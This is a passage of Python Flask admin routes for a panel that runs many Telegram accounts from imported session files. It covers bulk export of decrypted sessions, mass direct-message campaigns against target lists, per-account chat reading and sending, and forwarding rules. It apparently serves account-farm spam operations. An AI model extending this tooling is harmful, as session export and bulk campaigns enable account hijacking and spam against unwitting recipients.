@admin_required
def bulk_check_sessions():
    data = request.get_json()
    ids = data.get('ids', [])
    if not ids:
        return jsonify({'success': False, 'error': 'ids required'})
    try:
        from tasks.session_checker import check_single_session_task
        task_ids = []
        for aid in ids:
            t = check_single_session_task.delay(aid)
            task_ids.append(t.id)
        log_action('bulk_check_sessions', f'{len(ids)} accounts')
        return jsonify({'success': True, 'task_ids': task_ids})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@admin_bp.route('/accounts/bulk_export', methods=['POST'])
@login_required
def bulk_export():
    data = request.get_json()
    ids = data.get('ids', [])
    fmt = data.get('format', 'excel')
    if not ids:
        return jsonify({'success': False, 'error': 'ids required'})
    accounts = db.session.query(Account).filter(Account.id.in_(ids)).all()
    if fmt == 'txt':
        phones = '\n'.join(a.phone for a in accounts)
        return send_file(io.BytesIO(phones.encode('utf-8')),
                         mimetype='text/plain', as_attachment=True,
                         download_name='phones.txt')
    elif fmt == 'json':
        data_list = [{'id': a.id, 'phone': a.phone, 'username': a.username,
                      'status': a.status} for a in accounts]
        return send_file(io.BytesIO(json.dumps(data_list, ensure_ascii=False).encode('utf-8')),
                         mimetype='application/json', as_attachment=True,
                         download_name='accounts.json')
    elif fmt == 'sessions_zip':
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            for a in accounts:
                if a.session_data:
                    try:
                        from utils.encryption import decrypt_session_data
                        session_str = decrypt_session_data(a.session_data)
                        zf.writestr(f'{a.phone}.session', session_str)
                    except Exception:
                        pass
        zip_buffer.seek(0)
        return send_file(zip_buffer, mimetype='application/zip', as_attachment=True,
                         download_name='sessions.zip')
    else:
        try:
            from services.export.excel import ExcelExporter
            exporter = ExcelExporter()
            output = exporter.export_accounts(accounts)
            return send_file(output, mimetype='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
                             as_attachment=True, download_name='accounts.xlsx')
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)})


# --- CAMPAIGN DETAIL AND MANAGEMENT ---
@admin_bp.route('/campaigns/<int:campaign_id>')
@login_required
def campaign_detail(campaign_id):
    campaign = db.session.query(Campaign).filter(Campaign.id == campaign_id).first()
    if not campaign:
        flash('Кампания не найдена', 'error')
        return redirect(url_for('admin.campaigns'))
    return render_template('admin/campaign_detail.html', campaign=campaign)

@admin_bp.route('/campaigns/create', methods=['POST'])
@login_required
@admin_required
def campaign_create():
    data = request.get_json()
    targets_raw = data.get('targets', data.get('target_list', []))
    if isinstance(targets_raw, str):
        targets = [t.strip() for t in targets_raw.split('\n') if t.strip()]
    else:
        targets = targets_raw
    campaign = Campaign(
        name=data.get('name', 'New Campaign'),
        description=data.get('description', ''),
        target_type=data.get('target_type', 'direct_message'),
        target_list=targets,
        message_template=data.get('message_template', ''),
        variations=data.get('variations', []),
        total_targets=len(targets),
        created_by=current_user.id
    )
    db.session.add(campaign)
    db.session.commit()
    log_action('create_campaign', f'name={campaign.name}')
    return jsonify({'success': True, 'id': campaign.id})

@admin_bp.route('/campaigns/<int:campaign_id>/action', methods=['POST'])
@login_required
@admin_required
def campaign_action(campaign_id):
    data = request.get_json()
    action = data.get('action')
    campaign = db.session.query(Campaign).filter(Campaign.id == campaign_id).first()
    if not campaign:
        return jsonify({'success': False, 'error': 'Campaign not found'})
    if action == 'start':
        campaign.status = 'running'
        campaign.started_at = datetime.datetime.utcnow()
        db.session.commit()
        try:
            from tasks.mass_actions import run_campaign
            run_campaign.delay(campaign_id)
        except Exception as e:
            log.error(f'campaign start error: {e}')
    elif action == 'pause':
        campaign.status = 'paused'
        db.session.commit()
    elif action == 'stop':
        campaign.status = 'completed'
        campaign.completed_at = datetime.datetime.utcnow()
        db.session.commit()
    log_action(f'campaign_{action}', f'campaign_id={campaign_id}')
    return jsonify({'success': True, 'status': campaign.status})


# --- IMPORT SESSIONS ---
@admin_bp.route('/accounts/import_sessions', methods=['POST'])
@login_required
@admin_required
def import_sessions():
    files = request.files.getlist('sessions')
    imported = 0
    errors = []
    for f in files:
        try:
            raw = f.read()
            from utils.session_converter import detect_session_format, sqlite_session_to_string
            fmt = detect_session_format(raw)
            if fmt == 'sqlite':
                import tempfile
                with tempfile.NamedTemporaryFile(suffix='.session', delete=False) as tmp:
                    tmp.write(raw)
                    tmp_path = tmp.name
                try:
                    session_str = sqlite_session_to_string(tmp_path)
                finally:
                    try:
                        os.unlink(tmp_path)
                    except Exception:
                        pass
            else:
                session_str = raw.decode('utf-8').strip()
            if not session_str:
                continue
            from utils.encryption import encrypt_session_data
            acc = Account(
                id=uuid.uuid4().hex,
                phone=f'imported_{uuid.uuid4().hex[:8]}',
                session_data=encrypt_session_data(session_str),
                session_file=f.filename,
                status='active'
            )
            db.session.add(acc)
            db.session.commit()
            try:
                from tasks.session_checker import check_single_session_task
                check_single_session_task.delay(acc.id)
            except Exception:
                pass
            imported += 1
        except Exception as e:
            errors.append(str(e))
    log_action('import_sessions', f'imported={imported}')
    return jsonify({'success': True, 'imported': imported, 'errors': errors})

@admin_bp.route('/accounts/import_sessions_zip', methods=['POST'])
@login_required
@admin_required
def import_sessions_zip():
    f = request.files.get('file')
    if not f:
        return jsonify({'success': False, 'error': 'No file'})
    imported = 0
    errors = []
    try:
        zip_data = io.BytesIO(f.read())
        with zipfile.ZipFile(zip_data, 'r') as zf:
            for name in zf.namelist():
                if not name.endswith('.session'):
                    continue
                try:
                    raw = zf.read(name)
                    from utils.session_converter import detect_session_format, sqlite_session_to_string
                    fmt = detect_session_format(raw)
                    if fmt == 'sqlite':
                        import tempfile
                        with tempfile.NamedTemporaryFile(suffix='.session', delete=False) as tmp:
                            tmp.write(raw)
                            tmp_path = tmp.name
                        try:
                            session_str = sqlite_session_to_string(tmp_path)
                        finally:
                            try:
                                os.unlink(tmp_path)
                            except Exception:
                                pass
                    else:
                        session_str = raw.decode('utf-8').strip()
                    if not session_str:
                        errors.append(f'{name}: empty session')
                        continue
                    from utils.encryption import encrypt_session_data
                    acc = Account(
                        id=uuid.uuid4().hex,
                        phone=f'imported_{uuid.uuid4().hex[:8]}',
                        session_data=encrypt_session_data(session_str),
                        session_file=name,
                        status='active'
                    )
                    db.session.add(acc)
                    db.session.commit()
                    try:
                        from tasks.session_checker import check_single_session_task
                        check_single_session_task.delay(acc.id)
                    except Exception:
                        pass
                    imported += 1
                except Exception as e:
                    errors.append(f'{name}: {e}')
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})
    log_action('import_sessions_zip', f'imported={imported}')
    return jsonify({'success': True, 'imported': imported, 'errors': errors})

@admin_bp.route('/accounts/<account_id>/update_profile', methods=['POST'])
@login_required
@admin_required
def account_update_profile(account_id):
    data = request.get_json()
    try:
        import asyncio
        from services.telegram.actions import update_profile, update_username
        if any(k in data for k in ('first_name', 'last_name', 'about')):
            asyncio.run(update_profile(
                account_id,
                first_name=data.get('first_name'),
                last_name=data.get('last_name'),
                about=data.get('about')
            ))
        if 'username' in data:
            asyncio.run(update_username(account_id, data['username']))
        account = db.session.query(Account).filter(Account.id == account_id).first()
        if account:
            if 'first_name' in data: account.first_name = data['first_name']
            if 'last_name' in data: account.last_name = data['last_name']
            if 'username' in data: account.username = data['username']
            db.session.commit()
        log_action('update_profile', f'account={account_id}')
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@admin_bp.route('/accounts/<account_id>/update_avatar', methods=['POST'])
@login_required
@admin_required
def account_update_avatar(account_id):
    file = request.files.get('photo')
    if not file:
        return jsonify({'success': False, 'error': 'No photo file'})
    try:
        import asyncio
        from services.telegram.actions import update_avatar
        photo_bytes = file.read()
        success = asyncio.run(update_avatar(account_id, photo_bytes))
        log_action('update_avatar', f'account={account_id}')
        return jsonify({'success': success})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@admin_bp.route('/accounts/<account_id>/delete_avatar', methods=['POST'])
@login_required
@admin_required
def account_delete_avatar(account_id):
    try:
        import asyncio
        from services.telegram.actions import delete_avatar
        success = asyncio.run(delete_avatar(account_id))
        log_action('delete_avatar', f'account={account_id}')
        return jsonify({'success': success})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


# ==========================================
# TELEGRAM EVENT FEED
# ==========================================
@admin_bp.route('/events')
@login_required
def events():
    from models.account import Account as AccountModel
    accounts = db.session.query(AccountModel).filter(AccountModel.status == 'active').order_by(AccountModel.phone).all()
    return render_template('admin/events.html', accounts=accounts)


def _serialize_telegram_event(e):
    return {
        'id': e.id,
        'account_id': e.account_id,
        'event_type': e.event_type,
        'sender_username': e.sender_username,
        'sender_name': e.sender_name,
        'chat_title': e.chat_title,
        'chat_type': e.chat_type,
        'text_preview': e.text_preview,
        'media_type': e.media_type,
        'is_read': e.is_read,
        'created_at': e.created_at.isoformat() if e.created_at else None,
    }


@admin_bp.route('/api/events')
@login_required
def api_events():
    from models.telegram_event import TelegramEvent
    page = int(request.args.get('page', 1))
    limit = min(int(request.args.get('limit', 50)), 200)
    event_type = request.args.get('event_type', '')
    account_id = request.args.get('account_id', '')
    unread_only = request.args.get('unread_only', '') == '1'
    last_id = request.args.get('last_id', 0, type=int)
    q = db.session.query(TelegramEvent)
    if event_type:
        q = q.filter(TelegramEvent.event_type == event_type)
    if account_id:
        q = q.filter(TelegramEvent.account_id == account_id)
    if unread_only:
        q = q.filter(TelegramEvent.is_read == False)
    if last_id:
        q = q.filter(TelegramEvent.id > last_id).order_by(TelegramEvent.id)
        items = q.limit(limit).all()
        return jsonify({'success': True, 'total': len(items), 'events': [_serialize_telegram_event(e) for e in items]})
    q = q.order_by(desc(TelegramEvent.created_at))
    total = q.count()
    items = q.offset((page - 1) * limit).limit(limit).all()
    return jsonify({'success': True, 'total': total, 'events': [_serialize_telegram_event(e) for e in items]})


@admin_bp.route('/api/events/poll')
@login_required
def api_events_poll():
    """Polling endpoint for new events since last_id. Returns JSON and closes immediately."""
    from models.telegram_event import TelegramEvent
    last_id = request.args.get('last_id', 0, type=int)
    new_events = db.session.query(TelegramEvent).filter(
        TelegramEvent.id > last_id
    ).order_by(TelegramEvent.id).limit(20).all()
    return jsonify({'success': True, 'events': [_serialize_telegram_event(ev) for ev in new_events]})


@admin_bp.route('/api/events/<int:event_id>/mark_read', methods=['POST'])
@login_required
def api_event_mark_read(event_id):
    from models.telegram_event import TelegramEvent
    ev = db.session.query(TelegramEvent).filter(TelegramEvent.id == event_id).first()
    if not ev:
        return jsonify({'success': False, 'error': 'Not found'})
    ev.is_read = True
    db.session.commit()
    return jsonify({'success': True})


@admin_bp.route('/api/events/stats')
@login_required
def api_events_stats():
    from models.telegram_event import TelegramEvent
    import datetime as dt
    today = dt.date.today()
    today_start = dt.datetime.combine(today, dt.time.min)
    by_type = db.session.query(TelegramEvent.event_type, func.count(TelegramEvent.id)).group_by(TelegramEvent.event_type).all()
    total_today = db.session.query(func.count(TelegramEvent.id)).filter(TelegramEvent.created_at >= today_start).scalar() or 0
    unread = db.session.query(func.count(TelegramEvent.id)).filter(TelegramEvent.is_read == False).scalar() or 0
    return jsonify({'success': True, 'by_type': dict(by_type), 'today': total_today, 'unread': unread})


# ==========================================
# INBOX
# ==========================================
@admin_bp.route('/inbox')
@login_required
def inbox():
    from models.account import Account as AccountModel
    from models.user import User as UserModel
    accounts = db.session.query(AccountModel).filter(AccountModel.status == 'active').order_by(AccountModel.phone).all()
    users = db.session.query(UserModel).filter(UserModel.is_active == True).order_by(UserModel.username).all()
    return render_template('admin/inbox.html', accounts=accounts, users=users)


@admin_bp.route('/api/inbox')
@login_required
def api_inbox():
    from models.incoming_message import IncomingMessage
    page = int(request.args.get('page', 1))
    limit = min(int(request.args.get('limit', 50)), 200)
    account_id = request.args.get('account_id', '')
    sender = request.args.get('sender', '')
    is_read = request.args.get('is_read', '')
    q = db.session.query(IncomingMessage).filter(IncomingMessage.is_outgoing == False)
    if account_id:
        q = q.filter(IncomingMessage.account_id == account_id)
    if sender:
        q = q.filter(or_(IncomingMessage.sender_username.ilike(f'%{sender}%'), IncomingMessage.sender_name.ilike(f'%{sender}%')))
    if is_read == '0':
        q = q.filter(IncomingMessage.is_read == False)
    elif is_read == '1':
        q = q.filter(IncomingMessage.is_read == True)
    q = q.order_by(desc(IncomingMessage.created_at))
    total = q.count()
    items = q.offset((page - 1) * limit).limit(limit).all()
    return jsonify({'success': True, 'total': total, 'messages': [{
        'id': m.id,
        'account_id': m.account_id,
        'sender_tg_id': m.sender_tg_id,
        'sender_username': m.sender_username,
        'sender_name': m.sender_name,
        'chat_id': m.chat_id,
        'chat_type': m.chat_type,
        'chat_title': m.chat_title,
        'text': m.text,
        'media_type': m.media_type,
        'is_read': m.is_read,
        'assigned_to': m.assigned_to,
        'created_at': m.created_at.isoformat() if m.created_at else None,
    } for m in items]})


@admin_bp.route('/api/inbox/<int:msg_id>/mark_read', methods=['POST'])
@login_required
def api_inbox_mark_read(msg_id):
    from models.incoming_message import IncomingMessage
    msg = db.session.query(IncomingMessage).filter(IncomingMessage.id == msg_id).first()
    if not msg:
        return jsonify({'success': False, 'error': 'Not found'})
    msg.is_read = True
    db.session.commit()
    return jsonify({'success': True})


@admin_bp.route('/api/inbox/unread_count')
@login_required
def api_inbox_unread_count():
    from models.incoming_message import IncomingMessage
    count = db.session.query(func.count(IncomingMessage.id)).filter(
        IncomingMessage.is_read == False,
        IncomingMessage.is_outgoing == False
    ).scalar() or 0
    return jsonify({'success': True, 'count': count})


@admin_bp.route('/api/inbox/assign_chat', methods=['POST'])
@login_required
def api_inbox_assign_chat():
    """Передать чат другому оператору (Handover)."""
    from models.incoming_message import IncomingMessage
    from models.notification import Notification
    from models.user import User
    data = request.get_json() or {}
    account_id = data.get('account_id')
    chat_id = data.get('chat_id')
    assignee_id = data.get('assignee_id')
    if not account_id or not chat_id or not assignee_id:
        return jsonify({'success': False, 'error': 'account_id, chat_id, assignee_id required'})
    assignee = db.session.query(User).filter_by(id=assignee_id).first()
    if not assignee:
        return jsonify({'success': False, 'error': 'User not found'})
    # Verify that the chat actually has messages to assign
    msg_count = db.session.query(func.count(IncomingMessage.id)).filter(
        IncomingMessage.account_id == account_id,
        IncomingMessage.chat_id == str(chat_id),
    ).scalar() or 0
    if msg_count == 0:
        return jsonify({'success': False, 'error': 'Chat not found or has no messages'})
    # Update all messages in this chat
    db.session.query(IncomingMessage).filter(
        IncomingMessage.account_id == account_id,
        IncomingMessage.chat_id == str(chat_id),
    ).update({'assigned_to': assignee_id}, synchronize_session=False)
    # Create notification for the assignee
    notif = Notification(
        user_id=assignee_id,
        title='Вам передан чат',
        message=f'Оператор {current_user.username} передал вам чат (аккаунт {account_id}, chat_id {chat_id}).',
        type='info',
        category='handover',
        related_url='/admin/inbox',
    )
    db.session.add(notif)
    db.session.commit()
    return jsonify({'success': True})


# ==========================================
# MINI-MESSENGER (per account)
# ==========================================
@admin_bp.route('/accounts/<account_id>/dialogs')
@login_required
@admin_required
def account_dialogs(account_id):
    try:
        import asyncio
        from services.telegram.actions import get_dialogs
        result = asyncio.run(get_dialogs(account_id))
        return jsonify({'success': True, 'dialogs': result})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@admin_bp.route('/accounts/<account_id>/chat/<int:chat_id>/messages')
@login_required
@admin_required
def account_chat_messages(account_id, chat_id):
    try:
        import asyncio
        from services.telegram.actions import get_chat_messages
        limit = int(request.args.get('limit', 50))
        offset_id = int(request.args.get('offset_id', 0))
        result = asyncio.run(get_chat_messages(account_id, chat_id, limit=limit, offset_id=offset_id))
        return jsonify({'success': True, 'messages': result})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@admin_bp.route('/accounts/<account_id>/chat/<int:chat_id>/send', methods=['POST'])
@login_required
@admin_required
def account_chat_send(account_id, chat_id):
    data = request.get_json()
    text = data.get('text', '')
    reply_to = data.get('reply_to')
    if not text:
        return jsonify({'success': False, 'error': 'text required'})
    try:
        import asyncio
        from services.telegram.actions import send_message_to_chat
        result = asyncio.run(send_message_to_chat(account_id, chat_id, text, reply_to=reply_to))
        log_action('send_message', f'account={account_id} chat={chat_id}')
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@admin_bp.route('/accounts/<account_id>/chat/<int:chat_id>/read', methods=['POST'])
@login_required
@admin_required
def account_chat_read(account_id, chat_id):
    try:
        import asyncio
        from services.telegram.actions import mark_chat_read
        result = asyncio.run(mark_chat_read(account_id, chat_id))
        log_action('mark_chat_read', f'account={account_id} chat={chat_id}')
        return jsonify({'success': result})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@admin_bp.route('/accounts/<account_id>/groups')
@login_required
@admin_required
def account_groups(account_id):
    try:
        import asyncio
        from services.telegram.actions import get_account_groups
        result = asyncio.run(get_account_groups(account_id))
        return jsonify({'success': True, 'groups': result})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@admin_bp.route('/accounts/<account_id>/groups/<int:group_id>/leave', methods=['POST'])
@login_required
@admin_required
def account_group_leave(account_id, group_id):
    try:
        import asyncio
        from services.telegram.actions import leave_chat
        result = asyncio.run(leave_chat(account_id, group_id))
        log_action('leave_group', f'account={account_id} group={group_id}')
        return jsonify({'success': result})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@admin_bp.route('/accounts/<account_id>/search_messages')
@login_required
@admin_required
def account_search_messages(account_id):
    query = request.args.get('q', '')
    chat_id = request.args.get('chat_id', None, type=int)
    try:
        import asyncio
        from services.telegram.actions import search_messages
        result = asyncio.run(search_messages(account_id, chat_id=chat_id, query=query))
        return jsonify({'success': True, 'messages': result})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@admin_bp.route('/accounts/<account_id>/entity/<username>')
@login_required
@admin_required
def account_entity_info(account_id, username):
    try:
        import asyncio
        from services.telegram.actions import get_entity_info
        result = asyncio.run(get_entity_info(account_id, username))
        return jsonify({'success': True, 'entity': result})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


# ==========================================
# ALERT RULES
# ==========================================
@admin_bp.route('/alerts')
@login_required
def alerts():
    return render_template('admin/alerts.html')


@admin_bp.route('/api/alerts')
@login_required
def api_alerts_list():
    from models.alert_rule import AlertRule
    rules = db.session.query(AlertRule).order_by(desc(AlertRule.created_at)).all()
    return jsonify({'success': True, 'rules': [{
        'id': r.id,
        'name': r.name,
        'event_type': r.event_type,
        'condition': r.condition,
        'action': r.action,
        'action_params': r.action_params,
        'is_active': r.is_active,
        'created_at': r.created_at.isoformat() if r.created_at else None,
    } for r in rules]})


@admin_bp.route('/api/alerts', methods=['POST'])
@login_required
@admin_required
def api_alerts_create():
    from models.alert_rule import AlertRule
    data = request.get_json()
    rule = AlertRule(
        name=data.get('name', ''),
        event_type=data.get('event_type', 'any'),
        condition=data.get('condition'),
        action=data.get('action', 'notify_panel'),
        action_params=data.get('action_params'),
        is_active=data.get('is_active', True),
        created_by=current_user.id,
    )
    db.session.add(rule)
    db.session.commit()
    log_action('create_alert_rule', f'name={rule.name}')
    return jsonify({'success': True, 'id': rule.id})


@admin_bp.route('/api/alerts/<int:rule_id>', methods=['PUT'])
@login_required
@admin_required
def api_alerts_update(rule_id):
    from models.alert_rule import AlertRule
    rule = db.session.query(AlertRule).filter(AlertRule.id == rule_id).first()
    if not rule:
        return jsonify({'success': False, 'error': 'Not found'})
    data = request.get_json()
    for field in ('name', 'event_type', 'condition', 'action', 'action_params', 'is_active'):
        if field in data:
            setattr(rule, field, data[field])
    db.session.commit()
    log_action('update_alert_rule', f'id={rule_id}')
    return jsonify({'success': True})


@admin_bp.route('/api/alerts/<int:rule_id>', methods=['DELETE'])
@login_required
@admin_required
def api_alerts_delete(rule_id):
    from models.alert_rule import AlertRule
    rule = db.session.query(AlertRule).filter(AlertRule.id == rule_id).first()
    if not rule:
        return jsonify({'success': False, 'error': 'Not found'})
    db.session.delete(rule)
    db.session.commit()
    log_action('delete_alert_rule', f'id={rule_id}')
    return jsonify({'success': True})


@admin_bp.route('/api/alerts/<int:rule_id>/toggle', methods=['POST'])
@login_required
@admin_required
def api_alerts_toggle(rule_id):
    from models.alert_rule import AlertRule
    rule = db.session.query(AlertRule).filter(AlertRule.id == rule_id).first()
    if not rule:
        return jsonify({'success': False, 'error': 'Not found'})
    rule.is_active = not rule.is_active
    db.session.commit()
    log_action('toggle_alert_rule', f'id={rule_id} active={rule.is_active}')
    return jsonify({'success': True, 'is_active': rule.is_active})


@admin_bp.route('/api/forward_rules')
@login_required
def api_forward_rules_list():
    from models.forward_rule import ForwardRule
    rules = db.session.query(ForwardRule).order_by(desc(ForwardRule.created_at)).all()
    return jsonify({'success': True, 'rules': [{
        'id': r.id,
        'account_id': r.account_id,
        'filter_type': r.filter_type,
        'filter_value': r.filter_value,
        'destination_type': r.destination_type,
        'destination_value': r.destination_value,
        'is_active': r.is_active,
    } for r in rules]})


@admin_bp.route('/api/forward_rules', methods=['POST'])
@login_required
@admin_required
def api_forward_rules_create():
    from models.forward_rule import ForwardRule
    data = request.get_json()
    rule = ForwardRule(
        account_id=data.get('account_id'),
        filter_type=data.get('filter_type', 'all'),
        filter_value=data.get('filter_value'),
        destination_type=data.get('destination_type', 'admin_panel'),
        destination_value=data.get('destination_value'),
        is_active=data.get('is_active', True),
        created_by=current_user.id,
    )
    db.session.add(rule)
    db.session.commit()
    log_action('create_forward_rule', f'dest={rule.destination_type}')
    return jsonify({'success': True, 'id': rule.id})


@admin_bp.route('/api/forward_rules/<int:rule_id>', methods=['DELETE'])
@login_required
@admin_required
def api_forward_rules_delete(rule_id):
    from models.forward_rule import ForwardRule
    rule = db.session.query(ForwardRule).filter(ForwardRule.id == rule_id).first()
    if not rule:
        return jsonify({'success': False, 'error': 'Not found'})
    db.session.delete(rule)
    db.session.commit()
    log_action('delete_forward_rule', f'id={rule_id}')
    return jsonify({'success': True})


# ==========================================
# TEAM
# ==========================================
@admin_bp.route('/team')
@login_required
def team():
    from models.user_session import UserSession
    from models.team import Announcement
    import datetime as dt
    five_min_ago = dt.datetime.utcnow() - dt.timedelta(minutes=5)
    online_sessions = db.session.query(UserSession).filter(UserSession.last_active >= five_min_ago).all()
    online_user_ids = list({s.user_id for s in online_sessions})
    online_users = db.session.query(User).filter(User.id.in_(online_user_ids)).all() if online_user_ids else []
    now = dt.datetime.utcnow()
    announcements = db.session.query(Announcement).filter(
        or_(Announcement.expires_at.is_(None), Announcement.expires_at > now)
    ).order_by(desc(Announcement.is_pinned), desc(Announcement.created_at)).limit(10).all()
    recent_logs = db.session.query(AdminLog).order_by(desc(AdminLog.timestamp)).limit(20).all()
    return render_template('admin/team.html', online_users=online_users, announcements=announcements, recent_logs=recent_logs)


@admin_bp.route('/team/tasks')
@login_required
def team_tasks():
    from models.team import TeamTask
    users = db.session.query(User).filter(User.is_active == True).all()
    tasks_todo = db.session.query(TeamTask).filter(TeamTask.status == 'todo').order_by(desc(TeamTask.created_at)).all()
    tasks_inprog = db.session.query(TeamTask).filter(TeamTask.status == 'in_progress').order_by(desc(TeamTask.created_at)).all()
    tasks_done = db.session.query(TeamTask).filter(TeamTask.status == 'done').order_by(desc(TeamTask.created_at)).all()
    return render_template('admin/team_tasks.html', users=users, tasks_todo=tasks_todo, tasks_inprog=tasks_inprog, tasks_done=tasks_done)


@admin_bp.route('/api/team/tasks', methods=['POST'])
@login_required
@admin_required
def api_team_task_create():
    from models.team import TeamTask
    import datetime as dt
    data = request.get_json()
    due_date = None
    if data.get('due_date'):
        try:
            due_date = dt.datetime.fromisoformat(data['due_date'])
        except Exception:
            pass
    task = TeamTask(
        title=data.get('title', ''),
        description=data.get('description'),
        assigned_to=data.get('assigned_to'),
        created_by=current_user.id,
        status=data.get('status', 'todo'),
        priority=data.get('priority', 'medium'),
        due_date=due_date,
        related_entity_type=data.get('related_entity_type'),
        related_entity_id=data.get('related_entity_id'),
    )
    db.session.add(task)
    db.session.commit()
    log_action('create_team_task', f'title={task.title}')
    return jsonify({'success': True, 'id': task.id})


@admin_bp.route('/api/team/tasks/<int:task_id>', methods=['PUT'])
@login_required
@admin_required
def api_team_task_update(task_id):
    from models.team import TeamTask
    task = db.session.query(TeamTask).filter(TeamTask.id == task_id).first()
    if not task:
        return jsonify({'success': False, 'error': 'Not found'})
    data = request.get_json()
    for field in ('title', 'description', 'status', 'priority', 'assigned_to', 'related_entity_type', 'related_entity_id'):
        if field in data:
            setattr(task, field, data[field])
    if 'due_date' in data and data['due_date']:
        import datetime as dt
        try:
            task.due_date = dt.datetime.fromisoformat(data['due_date'])
        except Exception:
            pass
    db.session.commit()
    log_action('update_team_task', f'id={task_id}')
    return jsonify({'success': True})


@admin_bp.route('/api/team/tasks/<int:task_id>', methods=['DELETE'])
@login_required
@admin_required
def api_team_task_delete(task_id):
    from models.team import TeamTask
    task = db.session.query(TeamTask).filter(TeamTask.id == task_id).first()
    if not task:
        return jsonify({'success': False, 'error': 'Not found'})
    db.session.delete(task)
    db.session.commit()
    log_action('delete_team_task', f'id={task_id}')
    return jsonify({'success': True})


@admin_bp.route('/api/team/activity')
@login_required
def api_team_activity():
    logs = db.session.query(AdminLog).order_by(desc(AdminLog.timestamp)).limit(50).all()
    return jsonify({'success': True, 'activity': [{
        'id': l.id,
        'username': l.username,
        'action': l.action,
        'details': l.details,
        'ip': l.ip,
        'timestamp': l.timestamp.isoformat() if l.timestamp else None,
    } for l in logs]})


@admin_bp.route('/api/comments', methods=['POST'])
@login_required
@admin_required
def api_comments_create():
    from models.team import Comment
    data = request.get_json()
    comment = Comment(
        user_id=current_user.id,
        entity_type=data.get('entity_type', ''),
        entity_id=str(data.get('entity_id', '')),
        text=data.get('text', ''),
    )
    db.session.add(comment)
    db.session.commit()
    log_action('add_comment', f'{comment.entity_type}:{comment.entity_id}')
    return jsonify({'success': True, 'id': comment.id})


@admin_bp.route('/api/comments/<entity_type>/<entity_id>')
@login_required
def api_comments_get(entity_type, entity_id):
    from models.team import Comment
    comments = db.session.query(Comment).filter(
        Comment.entity_type == entity_type,
        Comment.entity_id == entity_id
    ).order_by(Comment.created_at).all()
    return jsonify({'success': True, 'comments': [{
        'id': c.id,
        'user_id': c.user_id,
        'text': c.text,
        'created_at': c.created_at.isoformat() if c.created_at else None,
    } for c in comments]})


@admin_bp.route('/api/announcements')
@login_required
def api_announcements_list():
    from models.team import Announcement
    import datetime as dt
    now = dt.datetime.utcnow()
    items = db.session.query(Announcement).filter(
        or_(Announcement.expires_at.is_(None), Announcement.expires_at > now)
    ).order_by(desc(Announcement.is_pinned), desc(Announcement.created_at)).all()
    return jsonify({'success': True, 'announcements': [{
        'id': a.id,
        'title': a.title,
        'text': a.text,
        'priority': a.priority,
        'is_pinned': a.is_pinned,
        'expires_at': a.expires_at.isoformat() if a.expires_at else None,
        'created_at': a.created_at.isoformat() if a.created_at else None,
    } for a in items]})


@admin_bp.route('/api/announcements', methods=['POST'])
@login_required
@admin_required
def api_announcements_create():
    from models.team import Announcement
    import datetime as dt
    if current_user.role not in ('superadmin', 'admin'):
        return jsonify({'success': False, 'error': 'Forbidden'})
    data = request.get_json()
    expires_at = None
    if data.get('expires_at'):
        try:
            expires_at = dt.datetime.fromisoformat(data['expires_at'])
        except Exception:
            pass
    ann = Announcement(
        title=data.get('title', ''),
        text=data.get('text', ''),
        author_id=current_user.id,
        priority=data.get('priority', 'normal'),
        is_pinned=data.get('is_pinned', False),
        expires_at=expires_at,
    )
    db.session.add(ann)
    db.session.commit()
    log_action('create_announcement', f'title={ann.title}')
    return jsonify({'success': True, 'id': ann.id})


@admin_bp.route('/api/announcements/<int:ann_id>', methods=['DELETE'])
@login_required
@admin_required
def api_announcements_delete(ann_id):
    from models.team import Announcement
    ann = db.session.query(Announcement).filter(Announcement.id == ann_id).first()
    if not ann:
        return jsonify({'success': False, 'error': 'Not found'})
    db.session.delete(ann)
    db.session.commit()
    log_action('delete_announcement', f'id={ann_id}')
    return jsonify({'success': True})


@admin_bp.route('/api/templates')
@login_required
def api_templates_list():
    from models.team import SharedTemplate
    items = db.session.query(SharedTemplate).order_by(desc(SharedTemplate.created_at)).all()
    return jsonify({'success': True, 'templates': [{
        'id': t.id,
        'name': t.name,
        'type': t.type,
        'content': t.content,
        'is_shared': t.is_shared,
        'created_at': t.created_at.isoformat() if t.created_at else None,
    } for t in items]})


@admin_bp.route('/api/templates', methods=['POST'])
@login_required
@admin_required
def api_templates_create():
    from models.team import SharedTemplate
    data = request.get_json()
    tmpl = SharedTemplate(
        name=data.get('name', ''),
        type=data.get('type', 'message'),
        content=data.get('content', {}),
        created_by=current_user.id,
        is_shared=data.get('is_shared', True),
    )
    db.session.add(tmpl)
    db.session.commit()
    log_action('create_template', f'name={tmpl.name}')
    return jsonify({'success': True, 'id': tmpl.id})


@admin_bp.route('/api/templates/<int:tmpl_id>', methods=['DELETE'])
@login_required
@admin_required
def api_templates_delete(tmpl_id):
    from models.team import SharedTemplate
    tmpl = db.session.query(SharedTemplate).filter(SharedTemplate.id == tmpl_id).first()
    if not tmpl:
        return jsonify({'success': False, 'error': 'Not found'})
    db.session.delete(tmpl)
    db.session.commit()
    log_action('delete_template', f'id={tmpl_id}')
    return jsonify({'success': True})


@admin_bp.route('/settings/notifications', methods=['GET', 'POST'])
@login_required
def notification_settings():
    from models.panel_settings import PanelSettings
    if request.method == 'POST':
        data = request.get_json() or {}
        try:
            # Save per-user Telegram bot settings on the user record
            for key in ('tg_bot_token', 'tg_chat_id'):
                val = data.pop(key, None)
                if val is not None:
                    setattr(current_user, key, val)
            current_user.notification_prefs = data
            db.session.commit()
            log_action('update_notification_settings', '')
            return jsonify({'success': True})
        except Exception as e:
            db.session.rollback()
            return jsonify({'success': False, 'error': str(e)})
